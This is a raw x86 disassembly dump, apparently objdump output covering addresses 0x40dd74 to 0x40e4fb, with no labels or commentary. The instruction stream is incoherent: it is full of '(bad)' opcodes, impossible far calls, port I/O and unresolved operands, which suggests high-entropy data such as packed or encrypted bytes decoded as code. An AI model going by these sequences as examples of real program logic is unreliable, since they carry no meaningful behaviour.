  40dd74:	inc    esp
  40dd75:	xor    bl,cl
  40dd77:	mov    dh,0x7b
  40dd79:	xlat   BYTE PTR ds:[ebx]
  40dd7a:	outs   dx,DWORD PTR ds:[esi]
  40dd7b:	(bad)
  40dd7e:	out    dx,eax
  40dd7f:	add    DWORD PTR [ecx+0x2e704fd9],edi
  40dd85:	call   0x51bf:0x73443646
  40dd8c:	neg    BYTE PTR [ebp+edi*8-0x37]
  40dd90:	jl     0x40de0a
  40dd92:	push   0x5758fa5d
  40dd97:	sbb    al,0x95
  40dd99:	mov    dl,al
  40dd9b:	stos   DWORD PTR es:[edi],eax
  40dd9c:	fidiv  WORD PTR [esi+0x70b7ebea]
  40dda2:	ret    
  40dda3:	inc    bx
  40dda5:	cmp    DWORD PTR [eax],ebp
  40dda7:	fisttp QWORD PTR [ebx]
  40dda9:	nop
  40ddaa:	mov    ecx,?
  40ddac:	dec    eax
  40ddad:	lock mov ah,0x72
  40ddb0:	sahf   
  40ddb1:	dec    esi
  40ddb2:	xchg   ebp,eax
  40ddb3:	mov    ecx,edi
  40ddb5:	rcr    BYTE PTR [edi+0x44e77ed5],cl
  40ddbb:	xchg   edx,ecx
  40ddbd:	push   cs
  40ddbe:	pop    eax
  40ddbf:	bound  esi,QWORD PTR [edx]
  40ddc1:	retf   0xee08
  40ddc4:	retf   0x97e1
  40ddc7:	test   edx,0x8537472c
  40ddcd:	ins    BYTE PTR es:[edi],dx
  40ddce:	push   edx
  40ddcf:	and    esp,ebp
  40ddd1:	aaa    
  40ddd2:	sub    eax,0x5696609e
  40ddd7:	push   es
  40ddd8:	inc    ecx
  40ddd9:	mov    dh,0x91
  40dddb:	in     al,dx
  40dddc:	lods   al,BYTE PTR ds:[esi]
  40dddd:	dec    ecx
  40ddde:	dec    ebx
  40dddf:	cmp    ecx,DWORD PTR [edi]
  40dde1:	xchg   edx,eax
  40dde2:	jmp    0x3d7a2c22
  40dde7:	pop    edi
  40dde8:	pop    ecx
  40dde9:	xor    DWORD PTR [edx+ecx*2+0x1032b5b],edi
  40ddf0:	lds    ebx,FWORD PTR [edi]
  40ddf2:	sub    eax,0xec048f42
  40ddf7:	dec    edx
  40ddf8:	push   eax
  40ddf9:	inc    esp
  40ddfa:	mov    ah,0xcf
  40ddfc:	sub    dh,bh
  40ddfe:	push   ebx
  40ddff:	ja     0x40de18
  40de01:	jp     0x40de6b
  40de03:	jmp    0xcc28c15a
  40de08:	sub    eax,0x61e79d15
  40de0d:	pop    eax
  40de0e:	jmp    0xb634:0x941fee56
  40de15:	sub    al,0x94
  40de17:	ret    
  40de18:	and    edi,DWORD PTR [ebx+0x5639d233]
  40de1e:	mov    edx,0xcbb44776
  40de23:	sti    
  40de24:	cmp    edx,DWORD PTR [esi]
  40de26:	bnd jmp 0x48c585f1
  40de2c:	add    DWORD PTR [edi+0x19],edx
  40de2f:	mov    al,ds:0xb13d6877
  40de34:	ds inc edx
  40de36:	xchg   ebx,eax
  40de37:	in     al,dx
  40de38:	scas   al,BYTE PTR es:[edi]
  40de39:	ins    DWORD PTR es:[edi],dx
  40de3a:	ss jnp 0x40debc
  40de3d:	mov    bl,0xb5
  40de3f:	and    BYTE PTR [ecx+0x2],bl
  40de42:	adc    eax,DWORD PTR [esi+0x69]
  40de45:	int    0x49
  40de47:	xchg   edi,eax
  40de48:	add    eax,DWORD PTR [ebx+0x49b8d4b7]
  40de4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de4f:	add    eax,DWORD PTR [eax]
  40de51:	leave  
  40de52:	jno    0x40dec9
  40de54:	or     dh,BYTE PTR [ebx-0x27]
  40de57:	mov    DWORD PTR [ecx+0x222b444b],0x9354c62
  40de61:	cmp    eax,0x914ed9f0
  40de66:	mov    edx,0x2c469df0
  40de6b:	fprem  
  40de6d:	test   eax,0x25bede91
  40de72:	pop    ecx
  40de73:	rcl    DWORD PTR [eax],1
  40de75:	lods   eax,DWORD PTR ds:[esi]
  40de76:	jmp    0x23c2:0x91fcc913
  40de7d:	sbb    al,0x58
  40de7f:	or     al,0x1e
  40de81:	stos   DWORD PTR es:[edi],eax
  40de82:	ds aas 
  40de84:	jg     0x40de4a
  40de86:	cmp    dh,BYTE PTR [esi]
  40de88:	xor    DWORD PTR [edx-0x65],eax
  40de8b:	sbb    DWORD PTR [ebx-0x2742c577],eax
  40de91:	nop
  40de92:	fisub  DWORD PTR [ebp+0x73a8eb34]
  40de98:	sub    dl,BYTE PTR [edx-0x5b]
  40de9b:	and    eax,0x8d5b03fc
  40dea0:	outs   dx,BYTE PTR ds:[esi]
  40dea1:	adc    BYTE PTR [ecx+0x30],bl
  40dea4:	ins    BYTE PTR es:[edi],dx
  40dea5:	iret   
  40dea6:	jns    0x40de40
  40dea8:	fadd   QWORD PTR ds:0x3dbc907d
  40deae:	enter  0x90de,0xc3
  40deb2:	test   esp,ebx
  40deb4:	cdq    
  40deb5:	retf   
  40deb6:	dec    ebp
  40deb7:	push   ds
  40deb8:	fcomip st,st(3)
  40deba:	sub    ebp,DWORD PTR [edx-0x40]
  40debd:	push   cs
  40debe:	iret   
  40debf:	or     DWORD PTR [ebp-0x2b],ebx
  40dec2:	stos   BYTE PTR es:[edi],al
  40dec3:	je     0x40de51
  40dec5:	outs   dx,DWORD PTR ds:[esi]
  40dec6:	retf   
  40dec7:	jl     0x40de95
  40dec9:	dec    edi
  40deca:	rcl    BYTE PTR [ebp-0x5b5e8da2],cl
  40ded0:	int    0xff
  40ded2:	fstp   TBYTE PTR [edx+0x58]
  40ded5:	daa    
  40ded6:	vpmacsdd ymm0,ymm7,YMMWORD PTR [ebx+0x5e],ymm4
  40dedd:	mov    eax,ds:0x2780c39f
  40dee2:	scas   al,BYTE PTR es:[edi]
  40dee3:	xlat   BYTE PTR ds:[ebx]
  40dee4:	inc    edi
  40dee5:	adc    ch,BYTE PTR [ecx]
  40dee7:	jmp    0x40deb5
  40dee9:	loopne 0x40df61
  40deeb:	arpl   WORD PTR [edx+0x70],si
  40deee:	in     eax,dx
  40deef:	lods   eax,DWORD PTR ds:[esi]
  40def0:	push   ds
  40def1:	pop    esi
  40def2:	mov    eax,0x7fb1e21e
  40def7:	jge    0x40df31
  40def9:	ret    
  40defa:	je     0x40de9d
  40defc:	ret    0xe97a
  40deff:	jnp    0x40df7c
  40df01:	repz push ecx
  40df03:	or     eax,edx
  40df05:	sbb    BYTE PTR [ecx+0x23],bh
  40df08:	jmp    DWORD PTR [esi+0x3c]
  40df0b:	push   ecx
  40df0c:	sub    BYTE PTR ds:0x3d22e00d,dh
  40df12:	mov    edi,0x42a5bbb2
  40df17:	int3   
  40df18:	lds    ebp,FWORD PTR [ecx+0x5c779e13]
  40df1e:	xchg   edi,eax
  40df1f:	sbb    BYTE PTR [edx+0x25],al
  40df22:	mov    bl,0xdf
  40df24:	cmp    BYTE PTR [ebx-0x1e],bl
  40df27:	scas   al,BYTE PTR es:[edi]
  40df28:	fisub  DWORD PTR [eax+0x18]
  40df2b:	push   cs
  40df2c:	add    BYTE PTR [edi],ah
  40df2e:	std    
  40df2f:	or     al,0xf0
  40df32:	in     al,0xe2
  40df34:	push   ds
  40df35:	inc    esp
  40df36:	jae    0x40df90
  40df38:	push   esi
  40df39:	in     eax,dx
  40df3a:	pop    edi
  40df3b:	lahf   
  40df3c:	call   DWORD PTR [esi+0x11]
  40df3f:	xor    cl,dh
  40df41:	bound  eax,QWORD PTR ds:0x4e598ac4
  40df47:	ins    BYTE PTR es:[edi],dx
  40df48:	cld    
  40df49:	mov    ds:0xee1da919,al
  40df4e:	sub    DWORD PTR [edi],edi
  40df50:	out    dx,al
  40df51:	adc    DWORD PTR [eax+0x33321d1],edx
  40df57:	mov    bh,0x18
  40df59:	inc    ecx
  40df5a:	test   eax,0xbfe6e353
  40df5f:	mov    ds:0xaa9a2208,eax
  40df64:	ror    BYTE PTR ds:0xbf53d956,cl
  40df6a:	cld    
  40df6b:	scas   eax,DWORD PTR es:[edi]
  40df6c:	mov    al,0xb0
  40df6e:	outs   dx,BYTE PTR ds:[esi]
  40df6f:	mov    ebx,esp
  40df71:	lds    ebp,FWORD PTR [eax-0x72]
  40df74:	and    al,0x1c
  40df76:	in     eax,dx
  40df77:	sbb    eax,0xd7ddf758
  40df7c:	lock jne 0x40df03
  40df7f:	retf   
  40df80:	adc    ch,BYTE PTR [edi]
  40df82:	gs dec ebx
  40df84:	jmp    0x6416d226
  40df89:	cdq    
  40df8a:	fs out dx,al
  40df8c:	bnd js 0x40e00c
  40df8f:	mov    ebp,0x88e557c5
  40df94:	jmp    0x6d5009d1
  40df99:	push   edi
  40df9a:	lods   eax,DWORD PTR ds:[esi]
  40df9b:	pop    edx
  40df9c:	cmp    eax,0xe5e59c3f
  40dfa1:	mov    ebx,0x5ee57850
  40dfa6:	clc    
  40dfa7:	lea    edi,ds:[edx+0x42]
  40dfab:	int    0x31
  40dfad:	mov    eax,0xc32c48ff
  40dfb2:	jg     0x40dfa2
  40dfb4:	pop    esi
  40dfb5:	xor    ebp,esi
  40dfb7:	fucomip st,st(0)
  40dfb9:	mov    al,BYTE PTR [ecx+esi*4+0x76ca43ba]
  40dfc0:	lds    edi,FWORD PTR [edi-0x12ad1c49]
  40dfc6:	sbb    dl,BYTE PTR es:[edx+edx*2+0x6c]
  40dfcb:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40dfcd:	jo     0x40dfa7
  40dfcf:	sub    eax,0x1f0fe574
  40dfd4:	test   al,0x2e
  40dfd6:	sub    edx,DWORD PTR [ebp-0x3e]
  40dfd9:	cmp    ecx,DWORD PTR [ebx-0x2a]
  40dfdc:	fbstp  TBYTE PTR ds:0xc61f072d
  40dfe2:	or     bl,BYTE PTR [edx-0x5911a364]
  40dfe8:	mov    al,ds:0x7d5aa178
  40dfed:	mov    ebp,0xc6279e48
  40dff2:	int3   
  40dff3:	adc    al,0x60
  40dff5:	out    dx,eax
  40dff6:	xor    eax,0xc83fb94
  40dffb:	jecxz  0x40df99
  40dffd:	ins    DWORD PTR es:[edi],dx
  40dffe:	adc    DWORD PTR [ebx+0x7b2b5df7],0x57
  40e005:	adc    dh,BYTE PTR [edx-0x769dcd45]
  40e00b:	or     BYTE PTR [esi+esi*4+0x79765f5e],cl
  40e012:	es repz push ecx
  40e015:	add    al,0xcc
  40e017:	loop   0x40dffe
  40e019:	imul   esp,DWORD PTR [ecx],0xffffffcb
  40e01c:	fdiv   st,st(6)
  40e01e:	push   ebx
  40e01f:	js     0x40e091
  40e021:	cli    
  40e022:	out    0xf8,eax
  40e024:	imul   esi,eax,0x2f
  40e027:	pop    esp
  40e028:	jmp    0x40dfb7
  40e02a:	fstp   QWORD PTR [esi+esi*2]
  40e02d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e02e:	inc    esi
  40e02f:	jl     0x40e019
  40e031:	lods   eax,DWORD PTR ds:[esi]
  40e032:	mov    ch,0x1a
  40e034:	mov    ecx,0x6cacdf9b
  40e039:	bound  esp,QWORD PTR [ecx+esi*1-0x174a276b]
  40e040:	in     al,0xaa
  40e042:	int    0x5f
  40e044:	rol    DWORD PTR [edx-0x70],1
  40e047:	scas   eax,DWORD PTR es:[edi]
  40e048:	ins    DWORD PTR es:[edi],dx
  40e049:	mov    esi,0xc0672076
  40e04e:	xlat   BYTE PTR ds:[ebx]
  40e04f:	icebp  
  40e050:	test   BYTE PTR [edi-0x54],dh
  40e053:	mov    bh,0x15
  40e055:	xchg   edx,eax
  40e056:	push   es
  40e057:	sbb    al,0x63
  40e059:	cmc    
  40e05a:	out    0xa4,eax
  40e05c:	call   0x73d9:0xcdaf36ae
  40e063:	call   0xe6c4:0x5077ef21
  40e06a:	xchg   ebp,eax
  40e06b:	or     DWORD PTR [edx],0xffffffda
  40e06e:	adc    eax,0xfd81d975
  40e073:	jns    0x40e0cc
  40e075:	fisubr WORD PTR [esi+0x53]
  40e078:	xchg   BYTE PTR [ebp-0x6ff06945],ch
  40e07e:	lds    edi,FWORD PTR [eax-0x11]
  40e081:	xor    al,0x61
  40e083:	clc    
  40e084:	pop    ebx
  40e085:	out    dx,eax
  40e086:	add    esp,0xffffffa5
  40e089:	add    al,BYTE PTR [edi+0x21ead27b]
  40e08f:	dec    ebp
  40e090:	xchg   esp,eax
  40e091:	scas   al,BYTE PTR es:[edi]
  40e092:	fnstsw WORD PTR [ecx]
  40e094:	dec    eax
  40e095:	adc    DWORD PTR [ebp-0x1b],eax
  40e098:	pop    edx
  40e099:	lds    esi,FWORD PTR [esi+ebx*4+0x7d1ae965]
  40e0a0:	sbb    eax,0x73b5410
  40e0a5:	je     0x40e060
  40e0a7:	nop
  40e0a8:	aaa    
  40e0a9:	test   ah,ch
  40e0ab:	mov    bl,0x93
  40e0ad:	std    
  40e0ae:	xchg   ecx,eax
  40e0af:	push   ss
  40e0b0:	push   ecx
  40e0b1:	ret    
  40e0b2:	mov    ah,0xf7
  40e0b4:	out    0xc1,al
  40e0b6:	into   
  40e0b7:	out    0x73,eax
  40e0b9:	push   ebx
  40e0ba:	aam    0x78
  40e0bc:	aad    0x54
  40e0be:	adc    DWORD PTR [ebp+0x61],ebp
  40e0c1:	cmp    BYTE PTR [ebx],dl
  40e0c3:	mov    bl,BYTE PTR [edi]
  40e0c5:	js     0x40e146
  40e0c7:	push   cs
  40e0c8:	repz call 0x6fba26d5
  40e0ce:	lock xchg ebp,eax
  40e0d1:	fisttp WORD PTR [ecx+0x52]
  40e0d4:	jb     0x40e073
  40e0d6:	fdiv   QWORD PTR [esi-0x423084ed]
  40e0dc:	(bad)  
  40e0dd:	mov    ecx,0xe7082532
  40e0e2:	cs pop es
  40e0e4:	adc    dh,al
  40e0e6:	shr    BYTE PTR [eax],0x9f
  40e0e9:	jge    0x40e0ea
  40e0eb:	fmul   DWORD PTR [edx-0x3]
  40e0ee:	and    al,0x7f
  40e0f0:	test   al,0x44
  40e0f2:	mov    eax,ds:0x1520f530
  40e0f7:	fstp   DWORD PTR [eax]
  40e0f9:	mov    edi,0x51022608
  40e0fe:	push   esp
  40e0ff:	(bad)  [ebp-0x1d47f1e2]
  40e105:	add    eax,0x8f6f562f
  40e10a:	outs   dx,BYTE PTR ds:[esi]
  40e10b:	xchg   ecx,eax
  40e10c:	leave  
  40e10d:	sbb    esi,ecx
  40e10f:	jmp    0x40e0b3
  40e111:	sbb    BYTE PTR [eax],cl
  40e113:	xlat   BYTE PTR ds:[ebx]
  40e114:	mov    ch,0x26
  40e116:	xor    al,0xe5
  40e118:	or     eax,0x47393476
  40e11d:	push   0x7b714322
  40e122:	call   0xa30a:0x4a9315ad
  40e129:	pop    ss
  40e12a:	loop   0x40e15f
  40e12c:	gs jo  0x40e0bf
  40e12f:	cmp    BYTE PTR [ebp-0x72],0x19
  40e133:	sub    dl,dh
  40e135:	outs   dx,BYTE PTR ds:[esi]
  40e136:	test   ebx,ebp
  40e138:	pop    ss
  40e139:	gs ds addr16 (bad) 
  40e13d:	fild   DWORD PTR es:[ebx+0x153f73e0]
  40e144:	nop
  40e145:	(bad)  
  40e146:	in     eax,0x78
  40e148:	lahf   
  40e149:	lods   al,BYTE PTR ds:[esi]
  40e14a:	push   cs
  40e14b:	imul   esp,DWORD PTR [edx],0xf579fbf1
  40e151:	xlat   BYTE PTR ds:[ebx]
  40e152:	pushf  
  40e153:	or     DWORD PTR [eax],edx
  40e155:	outs   dx,DWORD PTR ds:[esi]
  40e156:	mov    cl,BYTE PTR [edx+ebx*1+0x747b9d94]
  40e15d:	sub    al,0x56
  40e15f:	sbb    ebp,DWORD PTR [esp+edx*2+0x53]
  40e163:	nop
  40e164:	xor    DWORD PTR [eax-0x63bd425f],esi
  40e16a:	inc    ebp
  40e16b:	mov    dl,0x9c
  40e16d:	jnp    0x40e1ea
  40e16f:	cmp    ah,0xd6
  40e172:	frstpm(287 only) 
  40e174:	bnd jg 0x40e19b
  40e177:	or     DWORD PTR [edx],ebp
  40e179:	adc    ebx,edi
  40e17b:	psrlq  mm3,QWORD PTR [eax-0x1e]
  40e17f:	mov    eax,ds:0x9c717722
  40e184:	mov    eax,0x30cf8ac7
  40e189:	push   ebp
  40e18a:	loope  0x40e153
  40e18c:	xchg   edx,eax
  40e18d:	arpl   WORD PTR [edi],si
  40e18f:	popa   
  40e190:	(bad)  
  40e191:	loopne 0x40e16f
  40e193:	mov    ebp,DWORD PTR [eax+0x6c]
  40e196:	hlt    
  40e197:	je     0x40e1c1
  40e199:	jb     0x40e194
  40e19b:	sbb    eax,0xbdc90a45
  40e1a0:	xor    edx,eax
  40e1a2:	sub    eax,0x2260565
  40e1a7:	sar    DWORD PTR [ebx+0x54],1
  40e1aa:	push   edx
  40e1ab:	or     al,0x7f
  40e1ad:	aas    
  40e1ae:	or     eax,0x8084d9a2
  40e1b3:	and    eax,0x3c552b2e
  40e1b8:	jp     0x40e16d
  40e1ba:	xchg   DWORD PTR [ecx+eiz*4-0x14b77d65],edi
  40e1c1:	mov    al,0x37
  40e1c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1c4:	adc    eax,ebx
  40e1c6:	or     edx,edi
  40e1c8:	icebp  
  40e1c9:	out    0xe0,al
  40e1cb:	push   ebp
  40e1cc:	jno    0x40e240
  40e1ce:	jns    0x40e173
  40e1d0:	jp     0x40e21b
  40e1d2:	cld    
  40e1d3:	or     edx,DWORD PTR [eax]
  40e1d5:	repnz push esi
  40e1d7:	sbb    al,0x4c
  40e1d9:	test   eax,0xea164fce
  40e1de:	inc    ecx
  40e1df:	cs mov cl,BYTE PTR ss:[edi]
  40e1e3:	jne    0x40e23d
  40e1e5:	out    dx,eax
  40e1e6:	cs sti 
  40e1e8:	int3   
  40e1e9:	test   DWORD PTR cs:[edx+0x253e7289],esp
  40e1f0:	retf   
  40e1f1:	mov    dl,0x9
  40e1f3:	ror    DWORD PTR [ecx+esi*1-0x6],cl
  40e1f7:	add    eax,0xa4e3ab84
  40e1fc:	and    al,0xa3
  40e1fe:	test   al,0x6c
  40e200:	or     al,0x61
  40e202:	call   0xf081:0xbfbbcc0b
  40e209:	int3   
  40e20a:	lods   al,BYTE PTR ds:[esi]
  40e20b:	add    al,0x81
  40e20d:	loopne 0x40e23e
  40e20f:	cmp    bl,BYTE PTR [ebp+0x66]
  40e212:	add    eax,0x47c42890
  40e217:	jecxz  0x40e1a1
  40e219:	dec    ecx
  40e21a:	popa   
  40e21b:	fs rcl ebp,0x0
  40e21f:	scas   al,BYTE PTR es:[edi]
  40e220:	adc    eax,ebp
  40e222:	mov    al,ds:0x1bd3bb3
  40e227:	xor    bh,BYTE PTR [ebp*8-0x1e155be4]
  40e22e:	(bad)  
  40e22f:	sar    BYTE PTR [ebp+0x37709d7c],1
  40e235:	imul   esi,DWORD PTR [edx+ebp*2+0x11f41f16],0x5bb101c8
  40e240:	neg    DWORD PTR [esi]
  40e242:	jg     0x40e282
  40e244:	aad    0x8b
  40e246:	inc    ebp
  40e247:	pop    edx
  40e248:	mov    al,0x73
  40e24a:	out    0x30,eax
  40e24c:	jbe    0x40e294
  40e24e:	fcom   QWORD PTR [eax+ebp*2-0x3628ce6c]
  40e255:	lds    ebp,FWORD PTR [eax]
  40e257:	call   0x2f8d:0x12c89f17
  40e25e:	fwait
  40e25f:	adc    eax,0x62fab3fc
  40e264:	popf   
  40e265:	sub    bl,dh
  40e267:	cli    
  40e268:	ficom  DWORD PTR [edx+0x487c2b92]
  40e26e:	(bad)  
  40e270:	add    BYTE PTR [ecx+0x31],dl
  40e273:	sbb    al,0xd3
  40e275:	dec    eax
  40e276:	popf   
  40e277:	and    eax,0x1d278916
  40e27c:	into   
  40e27d:	inc    ebp
  40e27e:	outs   dx,DWORD PTR ds:[esi]
  40e27f:	mov    esp,0xac3dd513
  40e284:	mov    edx,0x7faf1ec5
  40e289:	jb     0x40e25f
  40e28b:	lock stos BYTE PTR es:[edi],al
  40e28d:	test   ch,cl
  40e28f:	call   0xe8c4adf5
  40e294:	inc    ebx
  40e295:	jbe    0x40e2ed
  40e297:	cli    
  40e298:	(bad)  [eax]
  40e29a:	push   esp
  40e29b:	xchg   edx,eax
  40e29c:	pop    es
  40e29d:	out    0x86,eax
  40e29f:	scas   eax,DWORD PTR es:[edi]
  40e2a0:	test   BYTE PTR [ebx+0x2],bh
  40e2a3:	push   0x4
  40e2a5:	mov    al,0xd0
  40e2a7:	repz xchg esp,eax
  40e2a9:	pusha  
  40e2aa:	mov    ebx,0xd02b0b12
  40e2af:	mov    eax,0x686debb0
  40e2b4:	sub    eax,0x1e725e9a
  40e2b9:	jnp    0x40e2ea
  40e2bb:	popf   
  40e2bc:	push   eax
  40e2bd:	fidiv  WORD PTR [ecx+0x204fec82]
  40e2c3:	sub    DWORD PTR [ebp-0x708ca517],esp
  40e2c9:	loopne 0x40e2f2
  40e2cb:	fstp   DWORD PTR [esi-0x3a8acfdd]
  40e2d1:	mov    WORD PTR [edi+0x10],?
  40e2d4:	shr    BYTE PTR [ecx+0x1965f1c7],1
  40e2da:	add    eax,0x749670d4
  40e2df:	jp     0x40e316
  40e2e1:	test   al,0x4f
  40e2e3:	cmp    ebp,esi
  40e2e5:	cmc    
  40e2e6:	shl    DWORD PTR [edi],1
  40e2e8:	and    ebx,esi
  40e2ea:	or     eax,0x4ac74467
  40e2ef:	push   edi
  40e2f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2f1:	jbe    0x40e34a
  40e2f3:	mov    edi,0x127e74fc
  40e2f8:	pop    esi
  40e2f9:	pop    es
  40e2fa:	test   al,0x57
  40e2fc:	mov    ebx,0x34a08dd5
  40e301:	inc    ebp
  40e302:	cdq    
  40e303:	mov    gs,WORD PTR [edx]
  40e305:	dec    esp
  40e306:	xlat   BYTE PTR ds:[ebx]
  40e307:	push   0x19bc812f
  40e30c:	push   ebp
  40e30d:	push   ebp
  40e30e:	or     ecx,esp
  40e310:	cmc    
  40e311:	std    
  40e312:	cmc    
  40e313:	leave  
  40e314:	shl    DWORD PTR [ebx+0x17],cl
  40e317:	cmp    BYTE PTR [ebp+0x7f],cl
  40e31a:	imul   eax,DWORD PTR [esi+0x21],0x8d897b8c
  40e321:	cmove  ebx,DWORD PTR [eax]
  40e324:	test   BYTE PTR [edi+0x77d2d836],bl
  40e32a:	push   esi
  40e32b:	dec    eax
  40e32c:	add    eax,0x3f3e202c
  40e331:	(bad)  
  40e332:	(bad)  
  40e333:	sbb    al,0xa3
  40e335:	mov    gs,WORD PTR [eax-0x41c5f291]
  40e33b:	dec    ebp
  40e33c:	aad    0xb0
  40e33e:	cmp    edi,esi
  40e340:	por    mm4,QWORD PTR [ebx]
  40e343:	aaa    
  40e344:	push   ebx
  40e345:	bound  ebp,QWORD PTR [esi+0x62]
  40e348:	cmp    DWORD PTR [ebp+0x4f6741b2],0x66b6a03e
  40e352:	outs   dx,BYTE PTR ds:[esi]
  40e353:	icebp  
  40e354:	adc    edx,0x7cace848
  40e35a:	dec    esi
  40e35b:	jmp    0xe7f01de8
  40e360:	fidiv  WORD PTR [ecx]
  40e362:	add    ch,ch
  40e364:	mov    eax,0x786b5c14
  40e369:	mov    BYTE PTR [ecx+edx*1+0x9277d65],0xa4
  40e371:	push   ebx
  40e372:	sub    BYTE PTR [eax-0x4f],bh
  40e375:	sub    esp,ebx
  40e377:	xchg   ebx,eax
  40e378:	adc    esp,DWORD PTR [eax-0x32]
  40e37b:	gs or  al,0x22
  40e37e:	jecxz  0x40e360
  40e380:	xor    al,0x98
  40e382:	jnp    0x40e3c2
  40e384:	jns    0x40e313
  40e386:	rcr    dl,0xec
  40e389:	push   es
  40e38a:	and    al,0x20
  40e38c:	mov    ds:0x2ed8bf49,eax
  40e391:	mov    dl,0xf8
  40e393:	mov    eax,0x321d87c
  40e398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e399:	jo     0x40e323
  40e39b:	pop    esi
  40e39c:	or     eax,0x597182c5
  40e3a1:	push   cs
  40e3a2:	sub    eax,ebx
  40e3a4:	push   ebx
  40e3a5:	and    BYTE PTR [ecx],dh
  40e3a7:	cmp    esp,edi
  40e3a9:	cdq    
  40e3aa:	loopne 0x40e3c8
  40e3ac:	prefetcht2 BYTE PTR [edx]
  40e3af:	push   esi
  40e3b0:	outs   dx,DWORD PTR ds:[esi]
  40e3b1:	arpl   WORD PTR [eax+0x7e],cx
  40e3b4:	ja     0x40e42b
  40e3b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3b7:	les    ebx,FWORD PTR [ecx+0x6c5e5c6e]
  40e3bd:	mov    ebx,0x1488ab1f
  40e3c2:	xchg   ecx,eax
  40e3c3:	and    ch,BYTE PTR [ebx]
  40e3c5:	outs   dx,DWORD PTR ds:[esi]
  40e3c6:	or     eax,0x28b0848d
  40e3cb:	arpl   di,si
  40e3cd:	inc    esi
  40e3ce:	leave  
  40e3cf:	les    ecx,FWORD PTR [edi-0x18cc39bd]
  40e3d5:	or     dh,0x6
  40e3d8:	fwait
  40e3d9:	jecxz  0x40e3ce
  40e3db:	dec    esp
  40e3dc:	dec    esp
  40e3dd:	or     al,0xac
  40e3df:	fiadd  WORD PTR [edi+0x4a097a55]
  40e3e5:	xlat   BYTE PTR ds:[ebx]
  40e3e6:	int3   
  40e3e7:	inc    ebx
  40e3e8:	lods   eax,DWORD PTR ds:[esi]
  40e3e9:	hlt    
  40e3ea:	sar    BYTE PTR [ecx+ebp*1+0x7],cl
  40e3ee:	jnp    0x40e39e
  40e3f0:	aad    0x82
  40e3f2:	(bad)  es:[edi]
  40e3f5:	int3   
  40e3f6:	pop    esi
  40e3f7:	fldenv [esi-0x2b]
  40e3fa:	cmp    ebp,DWORD PTR [eax+0x4eb50d72]
  40e400:	aas    
  40e401:	ficomp WORD PTR [esi-0x494fe4ec]
  40e407:	js     0x40e407
  40e409:	stos   BYTE PTR es:[edi],al
  40e40a:	repz xchg esi,eax
  40e40c:	adc    BYTE PTR [ecx+0x4b267d8],dh
  40e412:	mov    dh,0xbc
  40e414:	xlat   BYTE PTR ds:[ebx]
  40e415:	cld    
  40e416:	rcl    DWORD PTR [ecx+0xa3382f6],1
  40e41c:	call   0x6d5a:0x73d1a5d3
  40e423:	mov    esp,0xaed98577
  40e428:	mov    eax,DWORD PTR ds:0x988495bd
  40e42e:	jge    0x40e473
  40e430:	fsubr  QWORD PTR [edi]
  40e432:	inc    esp
  40e433:	dec    edi
  40e434:	jbe    0x40e416
  40e436:	les    ebx,FWORD PTR [edx+0x69b03e76]
  40e43c:	push   ebx
  40e43d:	adc    dl,BYTE PTR [eax-0x66]
  40e440:	cmp    BYTE PTR [esi],bh
  40e442:	jns    0x40e3ec
  40e444:	push   es
  40e445:	dec    esi
  40e446:	fild   QWORD PTR [edx-0x11]
  40e449:	pop    ds
  40e44a:	sbb    edx,DWORD PTR [esi+edx*1]
  40e44d:	arpl   WORD PTR [eax+0x43d86e04],bx
  40e453:	xor    cl,BYTE PTR [ebp-0x353cc67b]
  40e459:	frstor [esi+eiz*4-0x65]
  40e45d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e45e:	fidiv  DWORD PTR [ebp+eax*2-0x33]
  40e462:	mov    dh,0xc4
  40e464:	mov    al,0x2
  40e466:	imul   ebx,eax,0x18
  40e469:	push   ebx
  40e46a:	cs xchg esi,eax
  40e46c:	cld    
  40e46d:	ficom  WORD PTR [esi-0x7f]
  40e470:	sbb    esp,DWORD PTR [ecx]
  40e472:	das    
  40e473:	aas    
  40e474:	test   BYTE PTR [esp+eiz*8],bl
  40e477:	jmp    0x40e421
  40e479:	test   al,0x15
  40e47b:	inc    eax
  40e47c:	jp     0x40e458
  40e47e:	mov    dl,0xc8
  40e480:	rcr    DWORD PTR [edx-0x37],cl
  40e483:	retf   
  40e484:	mov    esi,0x51cedc53
  40e489:	imul   esi,DWORD PTR [ebx+0x5b],0x29919cb3
  40e490:	ret    
  40e491:	xchg   esp,eax
  40e492:	outs   dx,BYTE PTR ds:[esi]
  40e493:	mov    al,0x73
  40e495:	and    dl,al
  40e497:	and    eax,0x8041511
  40e49c:	or     BYTE PTR [esi+0xf],cl
  40e49f:	add    edx,esi
  40e4a1:	push   ebx
  40e4a2:	enter  0xc223,0xe1
  40e4a6:	popf   
  40e4a7:	das    
  40e4a8:	jns    0x40e45f
  40e4aa:	call   0xeb89168f
  40e4af:	les    ebp,FWORD PTR [eax+ebx*2-0x60]
  40e4b3:	adc    DWORD PTR [ebx-0x5e],ecx
  40e4b6:	mov    cl,0xd1
  40e4b8:	aad    0x41
  40e4ba:	fs fst st(0)
  40e4bd:	xor    ebx,esp
  40e4bf:	add    esi,ebp
  40e4c1:	inc    edx
  40e4c2:	add    DWORD PTR [esi+0x65],ebx
  40e4c5:	outs   dx,DWORD PTR ds:[esi]
  40e4c6:	shr    ch,cl
  40e4c8:	adc    esi,DWORD PTR [ebp+0xc]
  40e4cb:	pop    edi
  40e4cc:	add    eax,0xb6a95cdb
  40e4d1:	mov    edx,DWORD PTR [eax+0x97f594a]
  40e4d7:	dec    edx
  40e4d8:	sub    dl,cl
  40e4da:	mov    ch,0xa
  40e4dc:	mov    ?,WORD PTR [edx+0x66a62998]
  40e4e2:	rol    DWORD PTR [eax],1
  40e4e4:	and    eax,0x87425c4
  40e4e9:	xlat   BYTE PTR ds:[ebx]
  40e4ea:	jnp    0x40e557
  40e4ec:	sbb    DWORD PTR [ebx-0x2259e6e5],edx
  40e4f2:	out    0xca,eax
  40e4f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4f5:	mov    BYTE PTR [ebp+0x5ffa5f31],dh
  40e4fb:	dec    ebx
